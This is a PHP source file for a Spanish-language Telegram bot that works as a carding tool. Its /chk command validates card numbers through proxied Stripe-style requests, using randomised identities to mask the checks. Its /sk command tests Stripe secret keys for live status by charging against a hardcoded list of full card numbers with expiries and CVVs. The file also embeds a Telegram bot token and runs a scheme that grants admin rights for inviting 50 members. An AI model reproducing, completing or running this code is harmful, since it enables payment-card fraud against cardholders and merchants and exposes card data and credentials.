<?php 

$API_KEY = '1649128661:AAHFUNrVPJ6m0lkXdZRoMWF42II-uTtv12c';
##------------------------------##
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
 
 function sendaction($chat_id, $action){
 bot('sendchataction',[
 'chat_id'=>$chat_id,
 'action'=>$action
 ]);
 }
 //====================osirischk======================//
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$osirischk = $update->message;
$chat_id = $osirischk->chat->id;
$mid = $osirischk->message_id;
$text = $osirischk->text;
$cty = $osirischk->chat->type;
$fadmin = $osirischk->from->id;
$new = $osirischk->new_chat_member;
$name = $osirischk->from->first_name;
mkdir("osirischk");
$message = $update->message->text;
//====================osirischk======================//

if (isset($new)){
$i = file_get_contents("osirischk/datos.dat");
$datos="$i\n$chat_id=$fadmin";
file_put_contents("osirischk/datos.dat",$datos);
$i = file_get_contents("osirischk/datos.dat");
$soni = "$chat_id=$fadmin"; $str = substr_count($i,$soni);
if($str == 50){
$rep = str_replace($soni,"",$i);
file_put_contents("osirischk/datos.dat",$rep);
bot('promoteChatmember',[
 'chat_id'=>$chat_id,
 'user_id'=>$fadmin,
 'can_change_info'=>true,
 'can_post_messages'=>false,
 'can_edit_messages'=>false,
 'can_delete_messages'=>true,
  'can_invite_users'=>true,
    'can_restrict_members'=>true,
   'can_pin_messages'=>true,
 'can_promote_members'=>false
]);
bot('sendmessage',[
'chat_id'=>$chat_id,
 'text'=>"<b>$name agregó 50 miembros al grupo y el grupo lo conviertó en administrador</b>",
 'parse_mode'=>'html',
]);
}elseif($str < 50){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"<b>@$name
Hola Reto del grupo

Te doy  – 1– punto por referido
O invitados que traigas al
Grupo
👍👍👍👍👍👍👍 50 puntos
Y automático yo te hago 
Admin de este grupo

por un mes
_________________________
Putos por referidos ⭐ – $str
👍 
_________________________
👥  Llevás: $str
$sana: $us</b>",
'parse_mode'=>'html',
]);
}
}

//////////Gates////////
if(preg_match('/^\/([Ss]tart)/',$text)){
$start_time = round(microtime(true) * 1000);
      $send=  bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' =>"Iniciando bot espere unos segundos",
            ])->result->message_id;
        
                    $end_time = round(microtime(true) * 1000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" => "Hola Ya Puedes Usar el Bot" ,
                    ]);
}

///////////////
////primer gate chk bin
///////////

if(preg_match('/^\/([Bb]in)/',$text)){
$bin1 = substr($text, 5);
$bin = substr($bin1, 0, 6);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};


/////////////////////==========[1st CURL REQ]==========////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin1.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$phone = GetStr($fim, '"phone":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
$binlenth = strlen($bin);
$schemename = ucfirst("$scheme");
$typename = ucfirst("$type");

$start_time = round(microtime(true) * 10000);
      $send=  bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' =>"Dirigiendo al bin:",
            ])->result->message_id;
        
                    $end_time = round(microtime(true) * 10000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" => "BIN/IIN: $bin $emoji
Marca de tarjeta: $schemename
Tipo de tarjeta: $typename 
Nivel de tarjeta: $brand
Banko: $bank
Pais: $name - 💲$currency
Contacto emisores: $phone
━━━━━━━━━━━━━
Gate:chk bin() " . $time_taken . "btz",
                    ]);
}

////////gate-chk-sk

if(preg_match('/^\/([Ss]k)/',$text)){
$sec = substr($text, 4);
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}



$cc_info_arr[] = "4427323412042742|11|2022|778";
$cc_info_arr[] = "5343058756585058|10|2025|533";
$cc_info_arr[] = "4147203828377230|01|2022|163";
$cc_info_arr[] = "4152850030186221|09|2024|150";
$cc_info_arr[] = "5106043266617135|10|2024|630";
$cc_info_arr[] = "4537476137821332|03|2022|277";
$cc_info_arr[] = "379268117811006|09|2022|5013"; //This one is AMEX -_-
$cc_info_arr[] = "4500353004856035|10|2025|847";
$cc_info_arr[] = "4023600440000414|11|2024|147";
$cc_info_arr[] = "4427325662058237|09|2023|708";
$n = rand(0,9);
$cc_info = $cc_info_arr[$n];

/////////////////////==========[osirischk]==========////////////////

$i = explode("|", $cc_info);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$cvv = $i[3];

/////////////////////==========[1st CURL REQ]==========////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=".$cc."&card[exp_month]=".$mm."&card[exp_year]=".$yyyy."&card[cvc]=".$cvv."");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$start_time = round(microtime(true) * 2000);
      $send=  bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' =>"Dirigido a sk:",
            ])->result->message_id;

/////////////////===============[Result]===========///////////////////

if (strpos($result, 'api_key_expired')){
                $end_time = round(microtime(true) * 2000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" => "❌ DEAD KEY

<u>Key:  $sec
<u>Response:  Api Key Expired

━━━━━━━━━━━━━
", $time_taken . "ms",
                    ]);
}
	

/////////////////////////////////////////////////////////////

elseif (empty($sec)){
            $end_time = round(microtime(true) * 2000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>"❌ INVALID KEY PROVIDED ❌
",
	$time_taken . "ms",
                    ]);
}

/////////////////////////////////////////////////////////////

elseif (strpos($sec, 'sk_live_') === false) {
                $end_time = round(microtime(true) * 2000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>"❌ WTF  QP2 con esa key

Solo puedo comprobar SK Keys  Nibba! -_-


",
	$time_taken . "ms",
                    ]);
}


/////////////////////////////////////////////////////////////

elseif (strpos($result, 'Invalid API Key provided')) {
             $end_time = round(microtime(true) * 2000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>"❌ DEAD KEY

Key:  $sec
Response:  Invalid API Key

━━━━━━━━━━━━━
",
	$time_taken . "ms",
                    ]);
}


/////////////////////////////////////////////////////////////

elseif (strpos($result, 'testmode_charges_only')) {
          $end_time = round(microtime(true) * 2000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>"❌ DEAD KEY

Key: $sec
Response:  Test Mode Key

━━━━━━━━━━━━━
",
	$time_taken . "ms",
                    ]);
}

/////////////////////////////////////////////////////////////

elseif (strpos($result, 'test_mode_live_card')) {
        $end_time = round(microtime(true) * 2000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>"❌ DEAD KEY

Key:  $sec
Response:  Test Mode Key

━━━━━━━━━━━━━
",
	$time_taken . "ms",
                    ]);
}

/////////////////////////////////////////////////////////////

elseif (strpos($result, 'Invalid API Key provided:')) {
           $end_time = round(microtime(true) * 2000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>"❌ DEAD KEY

Key:  $sec
Response:  Invalid API Key

━━━━━━━━━━━━━
",
	$time_taken . "ms",
                    ]);
}

/////////////////////////////////////////////////////////////

elseif (strpos($result, 'invalid_request_error')) {
          $end_time = round(microtime(true) * 2000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>"❌ DEAD KEY

Key:  $sec
Response:  Invalid API Key

━━━━━━━━━━━━━
",
	$time_taken . "ms",
                    ]);
}

/////////////////////////////////////////////////////////////

else {
           $end_time = round(microtime(true) * 2000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>"✅ LIVE KEY

Key:  $sec
Response:  Live Key!

━━━━━━━━━━━━━
",
	$time_taken . "ms",
                    ]);
}}


/////////chk-ip-web

if(preg_match('/^\/([Ii]p)/',$text)){
$ip = substr($text, 4);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    
    if (strpos($data, 'success') !== false) {
        
        $ipv4 = json_decode($data);
        
        $host   = $ipv4->{"query"};
        $pais   = $ipv4->{"country"} == "" ? "N/A" : $ipv4->{"country"};
        $cidade = $ipv4->{"city"} == "" ? "N/A" : $ipv4->{"city"};
        $estado = $ipv4->{"regionName"} == "" ? "N/A" : $ipv4->{"regionName"};
        $isp    = $ipv4->{"isp"} == "" ? "N/A" : $ipv4->{"isp"};
        $lat    = $ipv4->{"lat"} == "" ? "N/A" : $ipv4->{"lat"};
        $lon    = $ipv4->{"lon"} == "" ? "N/A" : $ipv4->{"lon"};
        $zip    = $ipv4->{"zip"} == "" ? "N/A" : $ipv4->{"zip"};
        $as     = $ipv4->{"as"} == "" ? "N/A" : $ipv4->{"as"};
        $time   = $ipv4->{"timezone"} == "" ? "N/A" : $ipv4->{"timezone"};
        $start_time = round(microtime(true) * 1000);
      $send=  bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' =>"timer:",
            ])->result->message_id;
            
            
                 $end_time = round(microtime(true) * 1000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>  "HOST/IP: $host\nPaís: $pais\nEstado: $estado\nCidade: $cidade\nAS:  $as\nISP: $isp\nLatitude: $lat\nLongitude: $lon\nTime Zone: $time\nCódigo Postal: $zip". $time_taken . "ms",
                    ]);
}
        
    else {
              $end_time = round(microtime(true) * 1000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>  "Host inválido!". $time_taken . "ms",
                    ]);
}
        
} 

//////gate-cc-stripe
if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){

$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);
/////////////////////////===[Randomizing Details 
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
////////////////////////////===[Proxys]===//////////////
////////////////////////////////////////////

////////////////////////////==============[Proxy Section]===============//////////////////////////////

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
function cyraxproxies()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = cyraxproxies();
///////////////=[1st REQ]=/////////////////

$ch = curl_init();
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, '......');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ......',
'accept: ......',
'content-type: ......',
'origin: ......',
'referer: ......',
'sec-fetch-dest: ......',
'sec-fetch-mode: ......',
'sec-fetch-site: ......',
'user-agent: ......',
   ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '......');

 $result1 = curl_exec($ch);

 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 curl_close($ch);

//////////////=[2nd Req]=//////////////////

$ch = curl_init();
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, '......');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ......',
'method: ......',
'path: ......',
'scheme: ......',
'accept: ......',
'content-type: ......',
'cookie: ......',
'origin: ......',
'referer: ......',
'sec-fetch-dest: ......',
'sec-fetch-mode: ......',
'sec-fetch-site: ......',
'user-agent: ......',
'x-requested-with: ......'

   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'......');
$result2 = curl_exec($ch);
$id = getStr($result2, '"message":"', '"');
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);
$start_time = round(microtime(true) * 3000);
      $send=  bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' =>"Dirigiendo a la CC:",
            ])->result->message_id;
//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
 $end_time = round(microtime(true) * 3000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>'CARD: '.$lista.'
STATUS: APROVADA

RESPONSE:✅『 ★ CVV MATCHED ★ 』✅

Gateway: Only CCN
 '. $time_taken . "ms",
                    ]);
}


elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
 $end_time = round(microtime(true) * 3000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>'CARD: '.$lista.'
STATUS: APROVADA

RESPONSE:✅『 ★ CCN LIVE ★ 』✅

Gateway: Only CCN
 '. $time_taken . "ms",
                    ]);
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
 $end_time = round(microtime(true) * 3000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>'CARD: '.$lista.'
STATUS: DECLINADA

RESPONSE:❌『 ★ CC DEAD ★ 』❌

Gateway: Only CCN
 '. $time_taken . "ms",
                    ]);
}
elseif(!$result2){
 $end_time = round(microtime(true) * 3000);
                    $time_taken = $end_time - $start_time;
                    bot('editMessagetext',[
                        "chat_id" => $chat_id,
                        "message_id" => $send,
                        "text" =>'CARD: '.$lista.'
STATUS: ERROR
RESPONSE:❌『 ★ ERROR/API ★ 』❌
Gateway: Only CCN
 '. $time_taken . "ms",
                    ]);
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}

?>
